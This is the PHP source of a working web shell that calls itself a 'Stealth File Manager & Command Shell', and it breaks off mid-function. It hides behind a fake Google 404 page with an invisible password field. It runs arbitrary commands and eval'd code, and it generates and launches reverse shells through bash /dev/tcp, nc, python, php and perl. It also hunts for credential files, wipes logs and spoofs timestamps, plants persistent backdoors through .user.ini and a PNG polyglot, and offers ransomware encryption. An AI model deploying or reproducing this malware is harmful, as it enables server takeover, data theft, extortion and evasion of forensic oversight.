<?php
/**
 * Stealth File Manager & Command Shell (OOP Refactored)
 */

@session_start();
@set_time_limit(0);

// ==========================================
// [ CONFIGURATION ]
// ==========================================
class Config
{
    public static $password = "123";
}

// ==========================================
// [ INTERNAL SYSTEM UTILITIES ]
// ==========================================
class SysUtils
{
    public static function exe($cmd)
    {
        $res = '';
        $dis = @ini_get('disable_functions');
        $dis = ($dis) ? explode(',', strtolower(str_replace(' ', '', $dis))) : [];

        if (class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && !in_array('com', $dis)) {
            try {
                $wsh = new COM('WScript.Shell');
                $exec = $wsh->exec("cmd.exe /c " . $cmd);
                $stdOut = $exec->StdOut();
                return $stdOut->ReadAll();
            } catch (Exception $e) {
            }
        }

        if (function_exists('system') && !in_array('system', $dis)) {
            @ob_start();
            @system($cmd);
            $res = @ob_get_clean();
        } elseif (function_exists('shell_exec') && !in_array('shell_exec', $dis)) {
            $res = @shell_exec($cmd);
        } elseif (function_exists('exec') && !in_array('exec', $dis)) {
            @exec($cmd, $res_arr);
            $res = implode("\n", $res_arr);
        } elseif (function_exists('passthru') && !in_array('passthru', $dis)) {
            @ob_start();
            @passthru($cmd);
            $res = @ob_get_clean();
        } elseif (function_exists('popen') && !in_array('popen', $dis) && is_resource($f = @popen($cmd, "r"))) {
            while (!@feof($f)) {
                $res .= @fread($f, 1024);
            }
            @pclose($f);
        } elseif (function_exists('proc_open') && !in_array('proc_open', $dis)) {
            $desc = array(1 => array("pipe", "w"), 2 => array("pipe", "w"));
            $proc = @proc_open($cmd, $desc, $pipes);
            if (is_resource($proc)) {
                $res = @stream_get_contents($pipes[1]);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($proc);
            }
        } else {
            $res = "No working execution functions found! All target commands disabled.";
        }
        return $res;
    }

    public static function get_dir_files($dir)
    {
        if (function_exists('scandir') && !in_array('scandir', explode(',', str_replace(' ', '', @ini_get('disable_functions'))))) {
            return @scandir($dir);
        }
        $res = [];
        if ($handle = @opendir($dir)) {
            while (false !== ($entry = @readdir($handle))) {
                $res[] = $entry;
            }
            @closedir($handle);
        }
        return is_array($res) ? $res : [];
    }

    public static function read_file_content($file)
    {
        if (function_exists('file_get_contents'))
            return @file_get_contents($file);
        $content = '';
        $f = @fopen($file, 'r');
        if ($f) {
            while (!feof($f)) {
                $content .= @fread($f, 1024);
            }
            @fclose($f);
        }
        return $content;
    }

    public static function write_file_content($file, $content)
    {
        if (function_exists('file_put_contents'))
            return @file_put_contents($file, $content) !== false;
        $f = @fopen($file, 'w');
        if ($f) {
            $res = @fwrite($f, $content);
            @fclose($f);
            return $res !== false;
        }
        return false;
    }

    public static function getPerms($file)
    {
        if (!@file_exists($file))
            return '---------';
        $perms = @fileperms($file);
        $info = (($perms & 0x4000) == 0x4000) ? 'd' : '-';
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? 'x' : '-');
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? 'x' : '-');
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? 'x' : '-');
        return $info;
    }

    public static function redirectClean($dir, $msg = "")
    {
        if ($msg !== "")
            $_SESSION['sys_msg'] = $msg;
        header("Location: ?dir=" . urlencode($dir));
        exit;
    }

    public static function rrmdir($dir)
    {
        if (@is_dir($dir)) {
            $objects = @scandir($dir);
            if (is_array($objects)) {
                foreach ($objects as $object) {
                    if ($object != "." && $object != "..") {
                        if (@is_dir($dir . DIRECTORY_SEPARATOR . $object) && !@is_link($dir . DIRECTORY_SEPARATOR . $object)) {
                            self::rrmdir($dir . DIRECTORY_SEPARATOR . $object);
                        } else {
                            @unlink($dir . DIRECTORY_SEPARATOR . $object);
                        }
                    }
                }
            }
            return @rmdir($dir);
        }
        return false;
    }

    public static function rcopy($src, $dst)
    {
        if (@is_dir($src)) {
            @mkdir($dst);
            $files = @scandir($src);
            if (is_array($files)) {
                foreach ($files as $file) {
                    if ($file != "." && $file != "..") {
                        self::rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
                    }
                }
            }
        } else if (@file_exists($src)) {
            @copy($src, $dst);
        }
    }
}

// ==========================================
// [ AUTHENTICATION MODULE ]
// ==========================================
class Authenticator
{
    public static function check()
    {
        if (!isset($_SESSION['auth'])) {
            if (isset($_POST['p']) && $_POST['p'] === Config::$password) {
                $_SESSION['auth'] = true;
            } else {
                self::blockAccess();
            }
        }
    }

    private static function blockAccess()
    {
        echo '<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, minimum-scale=1, width=device-width">
    <title>Error 404 (Not Found)!!1</title>
    <style>
      *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}
    </style>
  </head>
  <body>
    <a href="//www.google.com/"><span id="logo" aria-label="Google"></span></a>
    <p><b>404.</b> <ins>That’s an error.</ins></p>
    <p>The requested URL was not found on this server.  <ins>That’s all we know.</ins></p>
    <form method="post">
      <input type="password" name="p" style="position:fixed; bottom:0; right:0; width:30px; height:30px; opacity:0; border:none; outline:none; background:transparent; cursor:default;" autocomplete="off">
    </form>
  </body>
</html>';
        exit;
    }
}

// ==========================================
// [ FILE MANAGER HANDLERS ]
// ==========================================
class FileManager
{
    private $dir_real;

    public function __construct($dir_real)
    {
        $this->dir_real = $dir_real;
    }

    public function process()
    {
        if (isset($_GET['delete']))
            $this->delete();
        if (isset($_POST['rename_file']) && isset($_POST['new_name']))
            $this->rename();
        if (isset($_POST['move_item']) && isset($_POST['dest_path']))
            $this->move();
        if (isset($_POST['copy_item']) && isset($_POST['dest_path']))
            $this->copy();
        if (isset($_POST['chmod_file']) && isset($_POST['new_perms']))
            $this->chmod();
        if (isset($_POST['edit_file']) && isset($_POST['file_content']))
            $this->edit();
        if (isset($_FILES['fileToUpload']))
            $this->upload();
        if (isset($_GET['download']))
            $this->download();
        if (isset($_POST['new_item_name']) && isset($_POST['item_type']))
            $this->create();
        if (isset($_GET['unzip']))
            $this->unzip();
        if (isset($_POST['zip_dir']) && isset($_POST['zip_name']))
            $this->zip();
        if (isset($_POST['mass_action']) && isset($_POST['mass_items']))
            $this->mass_action();
    }

    private function mass_action()
    {
        $action = $_POST['mass_action'];
        $items = explode('|||', $_POST['mass_items']);
        $param1 = isset($_POST['mass_param1']) ? $_POST['mass_param1'] : '';
        $count = 0;
        $err = 0;

        foreach ($items as $item) {
            if (trim($item) === '')
                continue;
            $full_path = $this->dir_real . DIRECTORY_SEPARATOR . $item;
            if (!@file_exists($full_path))
                continue;

            if ($action === 'delete') {
                if (@is_dir($full_path)) {
                    if (SysUtils::rrmdir($full_path))
                        $count++;
                    else
                        $err++;
                } else {
                    if (@unlink($full_path))
                        $count++;
                    else
                        $err++;
                }
            } elseif ($action === 'chmod') {
                $new_perms = octdec($param1);
                if (@chmod($full_path, $new_perms))
                    $count++;
                else
                    $err++;
            } elseif ($action === 'copy') {
                $dest = $param1 . DIRECTORY_SEPARATOR . basename($full_path);
                SysUtils::rcopy($full_path, $dest);
                if (@file_exists($dest))
                    $count++;
                else
                    $err++;
            } elseif ($action === 'move') {
                $dest = $param1 . DIRECTORY_SEPARATOR . basename($full_path);
                if (@rename($full_path, $dest))
                    $count++;
                else
                    $err++;
            }
        }

        if ($action === 'ransom_enc' || $action === 'ransom_dec') {
            $r_action = ($action === 'ransom_enc') ? 'encrypt' : 'decrypt';
            // Proxy to AdvancedTools::ransomware() by simulating POST (runs after FileManager::process())
            $_POST['ransom_target'] = 'MASS_SESSION';
            $_POST['ransom_key'] = $param1;
            $_POST['ransom_action'] = $r_action;
            $_SESSION['mass_ransom_items'] = $items;
            return;
        }

        $msg = "<span style='color:lime;'>[+] Mass Action '<strong>" . htmlspecialchars($action) . "</strong>' completed! Success: " . $count . " item(s). failed/skip: " . $err . " item(s).</span>";
        SysUtils::redirectClean($this->dir_real, $msg);
    }

    private function delete()
    {
        $del = $_GET['delete'];
        if (@file_exists($del)) {
            if (@is_dir($del)) {
                if (SysUtils::rrmdir($del))
                    SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] Directory deleted successfully!</span>");
                else
                    SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to delete directory.</span>");
            } else {
                if (@unlink($del))
                    SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] File deleted successfully!</span>");
                else
                    SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to delete file.</span>");
            }
        }
    }

    private function rename()
    {
        $old_name = $_POST['rename_file'];
        $new_name = dirname($old_name) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        if (@file_exists($old_name)) {
            if (@rename($old_name, $new_name))
                SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] File renamed successfully!</span>");
            else
                SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to rename file.</span>");
        }
    }

    private function move()
    {
        $src = $_POST['move_item'];
        $dst = $_POST['dest_path'];
        if (@file_exists($src)) {
            if (@rename($src, $dst))
                SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] Item moved successfully!</span>");
            else
                SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to move item.</span>");
        }
    }

    private function copy()
    {
        $src = $_POST['copy_item'];
        $dst = $_POST['dest_path'];
        if (@file_exists($src)) {
            SysUtils::rcopy($src, $dst);
            SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] Item copied successfully!</span>");
        }
    }

    private function chmod()
    {
        $file_perms = $_POST['chmod_file'];
        $new_perms = octdec($_POST['new_perms']);
        if (@file_exists($file_perms)) {
            if (@chmod($file_perms, $new_perms))
                SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] Permissions changed successfully!</span>");
            else
                SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to change permissions.</span>");
        }
    }

    private function edit()
    {
        $edit_target = $_POST['edit_file'];
        $new_content = $_POST['file_content'];
        if (SysUtils::write_file_content($edit_target, $new_content))
            SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] File saved successfully!</span>");
        else
            SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to save file.</span>");
    }

    private function upload()
    {
        $target_file = $this->dir_real . DIRECTORY_SEPARATOR . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] File " . basename($_FILES["fileToUpload"]["name"]) . " uploaded successfully!</span>");
        } else {
            SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Sorry, there was an error uploading your file.</span>");
        }
    }

    private function download()
    {
        $dl = $_GET['download'];
        if (@file_exists($dl) && !@is_dir($dl)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($dl) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($dl));
            $f = @fopen($dl, 'rb');
            if ($f) {
                while (!feof($f)) {
                    print (@fread($f, 1024 * 8));
                    @ob_flush();
                    @flush();
                }
                @fclose($f);
            } else {
                @readfile($dl);
            }
            exit;
        }
    }

    private function create()
    {
        $item_name = trim($_POST['new_item_name']);
        $item_type = $_POST['item_type'];
        $target_path = $this->dir_real . DIRECTORY_SEPARATOR . $item_name;

        if (!@file_exists($target_path)) {
            if ($item_type === 'file') {
                if (@touch($target_path))
                    SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] File created successfully!</span>");
                else
                    SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to create file.</span>");
            } elseif ($item_type === 'dir') {
                if (@mkdir($target_path))
                    SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] Directory created successfully!</span>");
                else
                    SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to create directory.</span>");
            }
        } else {
            SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Item already exists!</span>");
        }
    }

    private function unzip()
    {
        $uz_file = $_GET['unzip'];
        $uz_dir = dirname($uz_file) . DIRECTORY_SEPARATOR . pathinfo($uz_file, PATHINFO_FILENAME) . "_extracted";
        if (@file_exists($uz_file) && class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            if ($zip->open($uz_file) === TRUE) {
                if (!@file_exists($uz_dir))
                    @mkdir($uz_dir);
                $zip->extractTo($uz_dir);
                $zip->close();
                SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] ZIP extracted successfully to: " . basename($uz_dir) . "</span>");
            } else {
                SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to open ZIP file.</span>");
            }
        } else {
            SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] ZipArchive is not supported or file missing.</span>");
        }
    }

    private function zip()
    {
        if (class_exists('ZipArchive')) {
            $zip_dir = $_POST['zip_dir'];
            $zip_name = $zip_dir . DIRECTORY_SEPARATOR . basename($_POST['zip_name']);
            if (substr($zip_name, -4) !== '.zip')
                $zip_name .= '.zip';
            $zip = new ZipArchive();
            if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($zip_dir), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($files as $name => $file) {
                    if (!$file->isDir()) {
                        $file_path = $file->getRealPath();
                        $rel_path = substr($file_path, strlen($zip_dir) + 1);
                        if ($file_path !== $zip_name) {
                            $zip->addFile($file_path, $rel_path);
                        }
                    }
                }
                $zip->close();
                SysUtils::redirectClean($this->dir_real, "<span style='color:lime;'>[+] Directory compressed successfully to " . basename($zip_name) . "</span>");
            } else {
                SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] Failed to create ZIP archive.</span>");
            }
        } else {
            SysUtils::redirectClean($this->dir_real, "<span style='color:red;'>[-] ZipArchive class is not available!</span>");
        }
    }
}

// ==========================================
// [ ADVANCED EXPERT TOOLS ]
// ==========================================
class AdvancedTools
{
    private $dir_real;

    public function __construct($dir_real)
    {
        $this->dir_real = $dir_real;
    }

    public function process()
    {
        if (isset($_POST['cmd']) && trim($_POST['cmd']) !== '')
            $this->cmd();
        if (isset($_POST['eval_code']) && trim($_POST['eval_code']) !== '')
            $this->evalCode();
        if (isset($_POST['sql_query']) && trim($_POST['sql_query']) !== '')
            $this->sql();
        if (isset($_POST['scan_ip']) && isset($_POST['scan_ports']))
            $this->scan();
        if (isset($_POST['rs_ip']) && isset($_POST['rs_port']))
            $this->revShell();
        if (isset($_POST['auto_recon']))
            $this->recon();
        if (isset($_POST['self_defense']))
            $this->defense();
        if (isset($_POST['ghost_rootkit']))
            $this->ghost();
        if (isset($_POST['proc_mgr']))
            $this->proc();
        if (isset($_POST['inject_mgr']))
            $this->inject();
        if (isset($_POST['auto_deface']))
            $this->deface();
        if (isset($_POST['ransom_target']) && isset($_POST['ransom_action']))
            $this->ransomware();
    }

    private function cmd()
    {
        $cmd = htmlspecialchars($_POST['cmd']);
        $cmd_res = SysUtils::exe($_POST['cmd']);
        $_SESSION['cmd_out_text'] = htmlspecialchars($cmd_res);
        $_SESSION['cmd_request'] = $cmd;
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function evalCode()
    {
        $code = $_POST['eval_code'];
        ob_start();
        try {
            eval ($code);
        } catch (Throwable $e) {
            echo "Error: " . $e->getMessage();
        }
        $eval_res = ob_get_clean();
        $_SESSION['eval_out_text'] = htmlspecialchars($eval_res);
        $_SESSION['eval_request'] = $code;
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function sql()
    {
        $host = $_POST['sql_host'] ?: 'localhost';
        $user = $_POST['sql_user'] ?: 'root';
        $pass = $_POST['sql_pass'] ?: '';
        $db = $_POST['sql_db'] ?: '';
        $query = $_POST['sql_query'];

        ob_start();
        try {
            if (!class_exists('PDO'))
                throw new Exception("PDO Extension is not loaded in this PHP setup.");
            $dsn = "mysql:host=$host" . ($db !== '' ? ";dbname=$db" : "");
            $pdo = new PDO($dsn, $user, $pass);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $stmt = $pdo->query($query);
            if ($stmt) {
                $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
                if (count($result) > 0) {
                    echo "<table border='1' style='width:100%; border-collapse:collapse; color:#eee; font-size:12px;'><tr>";
                    foreach (array_keys($result[0]) as $k) {
                        echo "<th style='padding:5px; border:1px dashed #555; background:#111; color:#ff00ea; text-align:left;'>" . htmlspecialchars($k) . "</th>";
                    }
                    echo "</tr>";
                    foreach ($result as $row) {
                        echo "<tr>";
                        foreach ($row as $v) {
                            echo "<td style='padding:5px; border:1px dashed #444;'>" . htmlspecialchars((string) $v) . "</td>";
                        }
                        echo "</tr>";
                    }
                    echo "</table>";
                    echo "<div style='margin-top:10px; color:lime;'>&gt; " . count($result) . " rows returned.</div>";
                } else {
                    echo "<div style='color:lime;'>&gt; Query executed successfully. No rows returned.</div>";
                }
            }
        } catch (Throwable $e) {
            echo "<div style='color:red;'>Error: " . htmlspecialchars($e->getMessage()) . "</div>";
        }
        $_SESSION['sql_out_text'] = ob_get_clean();
        $_SESSION['sql_request'] = $query;
        $_SESSION['sql_cr'] = ['host' => $host, 'user' => $user, 'pass' => $pass, 'db' => $db];
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function scan()
    {
        $ip = trim($_POST['scan_ip']);
        $ports = explode(',', trim($_POST['scan_ports']));
        $timeout = 1;

        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>Scanning Target: <b>" . htmlspecialchars($ip) . "</b></div>";
        echo "<table border='1' style='width:100%; border-collapse:collapse; color:#eee; font-size:12px;'>";
        echo "<tr><th style='padding:5px; border:1px dashed #555; background:#111; color:#00ffff; text-align:left;'>PORT</th>";
        echo "<th style='padding:5px; border:1px dashed #555; background:#111; color:#00ffff; text-align:left;'>STATUS</th></tr>";

        foreach ($ports as $port) {
            $port = (int) trim($port);
            if ($port <= 0 || $port > 65535)
                continue;
            $fp = @fsockopen($ip, $port, $errno, $errstr, $timeout);
            if ($fp) {
                echo "<tr><td style='padding:5px; border:1px dashed #444; color:#00ff00; font-weight:bold;'>$port</td><td style='padding:5px; border:1px dashed #444; color:#00ff00; font-weight:bold;'>OPEN</td></tr>";
                fclose($fp);
            } else {
                echo "<tr><td style='padding:5px; border:1px dashed #444; color:#ff4444;'>$port</td><td style='padding:5px; border:1px dashed #444; color:#ff4444;'>CLOSED / FILTERED</td></tr>";
            }
        }
        echo "</table>";
        $_SESSION['scan_out_text'] = ob_get_clean();
        $_SESSION['scan_request'] = $ip;
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function revShell()
    {
        $ip = trim($_POST['rs_ip']);
        $port = (int) $_POST['rs_port'];
        $type = $_POST['rs_type'];
        $payload = "";

        if ($type == 'bash')
            $payload = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        elseif ($type == 'python')
            $payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'";
        elseif ($type == 'python3')
            $payload = "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'";
        elseif ($type == 'nc')
            $payload = "nc -e /bin/sh $ip $port";
        elseif ($type == 'php')
            $payload = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        elseif ($type == 'perl')
            $payload = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";

        $out = "<div style='color:#ffaa00; margin-bottom:10px;'>Generated Payload ($type) for $ip:$port</div>";
        $out .= "<input type='text' value='" . htmlspecialchars($payload) . "' style='width:100%; border:1px dashed #ff4444; background:#111; color:#ff4444; padding:8px; margin-bottom:10px;' onclick='this.select()'>";

        if (isset($_POST['rs_exec'])) {
            $out .= "<div style='color:lime;'>[+] Executing payload in background...</div>";
            ob_start();
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                SysUtils::exe("start /b " . $payload);
            else
                SysUtils::exe("nohup " . $payload . " > /dev/null 2>&1 &");
            ob_end_clean();
            $out .= "<div style='color:#bbb;'>> Execution command sent to system.</div>";
        }
        $_SESSION['rs_out_text'] = $out;
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function recon()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] Starting Server Reconnaissance...</div>";

        $uid = SysUtils::exe('id');
        if (empty($uid) || strpos(strtolower($uid), 'disabled') !== false)
            $uid = getmyuid();
        echo "<div style='color:#00ffff;'>User info: " . htmlspecialchars($uid) . "</div>";

        $fetchers = [];
        $w = SysUtils::exe('which wget');
        if ($w && strpos(strtolower($w), 'disabled') === false)
            $fetchers[] = 'wget';
        $c = SysUtils::exe('which curl');
        if ($c && strpos(strtolower($c), 'disabled') === false)
            $fetchers[] = 'curl';
        echo "<div style='color:#00ffff;'>Downloaders: " . implode(', ', $fetchers) . "</div>";

        echo "<div style='color:#ffaa00; margin-top:10px;'>[!] Sensitive Files Search (Depth 2):</div><ul>";
        $this->search_sens($this->dir_real);
        echo "</ul>";

        $_SESSION['recon_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function search_sens($dir, $depth = 0)
    {
        if ($depth > 1)
            return;
        $files = SysUtils::get_dir_files($dir);
        foreach ($files as $f) {
            if ($f == '.' || $f == '..')
                continue;
            $p = $dir . DIRECTORY_SEPARATOR . $f;
            if (is_dir($p))
                $this->search_sens($p, $depth + 1);
            else {
                $lname = strtolower($f);
                if (strpos($lname, 'config.php') !== false || strpos($lname, '.env') !== false || strpos($lname, 'id_rsa') !== false || strpos($lname, 'database.php') !== false) {
                    echo "<li style='color:#ff4444;'>" . htmlspecialchars($p) . "</li>";
                }
            }
        }
    }

    private function defense()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] Initiating Self-Defense Protocol...</div>";

        $target_time_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'index.php';
        if (!@file_exists($target_time_file))
            $target_time_file = dirname(__FILE__);

        if (@file_exists($target_time_file)) {
            $time = @filemtime($target_time_file);
            if ($time) {
                if (@touch(__FILE__, $time, $time))
                    echo "<div style='color:#00ffff;'>[!] Payload Timestamp Spoofed to match server environment. (Anti-Forensic)</div>";
                else
                    echo "<div style='color:#ffaa00;'>[!] Timestamp Spoofing Failed (Permission denied).</div>";
            }
        }

        if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
            echo "<div style='color:#ffaa00;'>[!] Attempting to clear system logs (auth.log, syslog, httpd)...</div>";
            SysUtils::exe("rm -rf /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/nginx/error.log; history -c; cat /dev/null > ~/.bash_history");
            echo "<div style='color:lime;'>[+] Log wiper executed asynchronously (if permission allows).</div>";
        }

        @header("X-Powered-By: ASP.NET");
        @header("Server: Microsoft-IIS/10.0");
        echo "<div style='color:#ff00ea;'>[!] HTTP Response Headers spoofed to IIS/ASP.NET. (WAF Evasion Active)</div>";

        $_SESSION['defense_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function ghost()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] Deploying Ghost Rootkit...</div>";
        $type = $_POST['ghost_type'];
        $pwd = $this->dir_real;

        if ($type === 'user_ini') {
            $payload_file = $pwd . DIRECTORY_SEPARATOR . '.sess_1337.php';
            $payload_code = "<?php if(isset(\$_SERVER['HTTP_X_GHOST'])){ @eval(base64_decode(\$_SERVER['HTTP_X_GHOST'])); exit; } ?>";
            SysUtils::write_file_content($payload_file, $payload_code);
            @touch($payload_file, @filemtime($pwd));

            $ini_file = $pwd . DIRECTORY_SEPARATOR . '.user.ini';
            $ini_content = @SysUtils::read_file_content($ini_file);
            if (strpos((string) $ini_content, '.sess_1337.php') === false) {
                SysUtils::write_file_content($ini_file, $ini_content . "\nauto_prepend_file = .sess_1337.php\n");
                @touch($ini_file, @filemtime($pwd));
            }
            echo "<div style='color:#00ff00;'>[✔] Method: .user.ini Auto-Prepend Injection<br>> Hidden payload <b>.sess_1337.php</b> created.<br>> .user.ini updated.<br>> <b>Result:</b> All access to PHP files in this directory will now silently execute our backdoor in background if Header <code>X-Ghost</code> is present. FUD 100%.</div>";
        } elseif ($type === 'htaccess_png') {
            $hta_file = $pwd . DIRECTORY_SEPARATOR . '.htaccess';
            $hta_content = @SysUtils::read_file_content($hta_file);
            if (strpos((string) $hta_content, 'application/x-httpd-php') === false) {
                SysUtils::write_file_content($hta_file, $hta_content . "\nAddType application/x-httpd-php .png\n");
                @touch($hta_file, @filemtime($pwd));
            }
            $png_file = $pwd . DIRECTORY_SEPARATOR . 'avatar.png';
            $png_content = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4\x89\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00\x05\x00\x01\x0D\x0A\x2D\xB4\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82";
            $png_content .= "\n<?php if(isset(\$_SERVER['HTTP_X_GHOST'])){ @eval(base64_decode(\$_SERVER['HTTP_X_GHOST'])); exit; } ?>";
            SysUtils::write_file_content($png_file, $png_content);
            @touch($png_file, @filemtime($pwd));
            echo "<div style='color:#00ff00;'>[✔] Method: .htaccess Polyglot Spoofing<br>> Fake image <b>avatar.png</b> compiled with Payload.<br>> .htaccess mapping added.<br>> <b>Result:</b> You can now access avatar.png via browser. It acts as a legit image file to normal visitors and scanners but executes PHP! Use Header <code>X-Ghost</code> to execute.</div>";
        }
        echo "<div style='color:#00bfff; margin-top:10px;'><b>How to use:</b> Send an HTTP Request using Burpsuite / CURL with custom header <code>X-Ghost: [BASE64_PHP_CODE]</code> to this directory or the avatar.png file.</div>";
        $_SESSION['ghost_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function proc()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] System Process List:</div>";
        if (isset($_POST['kill_pid']) && trim($_POST['kill_pid']) !== '') {
            $pid = (int) $_POST['kill_pid'];
            echo "<div style='color:#ff0000; margin-bottom:10px;'>[!] Attempting to kill PID: $pid</div>";
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                SysUtils::exe("taskkill /F /PID $pid");
            else
                SysUtils::exe("kill -9 $pid");
            echo "<div style='color:lime; margin-bottom:10px;'>> Kill signal sent.</div>";
        }
        $proc_res = '';
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
            $proc_res = SysUtils::exe('tasklist');
        else
            $proc_res = SysUtils::exe('ps aux');

        if (trim($proc_res) === '')
            $proc_res = "Could not retrieve process list. Command might be disabled or restricted.";
        echo "<pre id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:250px; max-height:50vh; overflow-y:auto; overflow-x:auto; background:#111; color:#ffff00; border:1px dashed #ffff00; padding:10px; width:100%; box-sizing:border-box;'>" . htmlspecialchars($proc_res) . "</pre>";
        $_SESSION['proc_out_text'] = ob_get_clean();
        header("Location: ?dir=" . urlencode($this->dir_real));
        exit;
    }

    private function inject()
    {
        ob_start();
        echo "<div style='color:lime; margin-bottom:10px;'>[+] Starting Mass Persistence Injector...</div>";
        $inj_dir = $_POST['inj_dir'];
        $inj_files = array_map('trim', explode(',', strtolower($_POST['inj_files'])));
        $inj_payload = $_POST['inj_payload'];
